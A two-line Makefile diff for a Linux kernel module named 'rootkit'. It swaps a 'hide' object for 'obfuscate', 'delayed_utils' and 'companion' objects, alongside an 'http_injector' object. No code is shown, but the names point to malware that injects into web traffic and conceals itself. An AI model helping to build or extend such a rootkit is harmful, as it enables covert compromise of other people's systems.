@@ -1,2 +1,2 @@
 obj-m := rootkit.o
-rootkit-objs := main.o http_injector.o fast_search.o hide.o
+rootkit-objs := main.o http_injector.o fast_search.o obfuscate.o delayed_utils.o companion.o
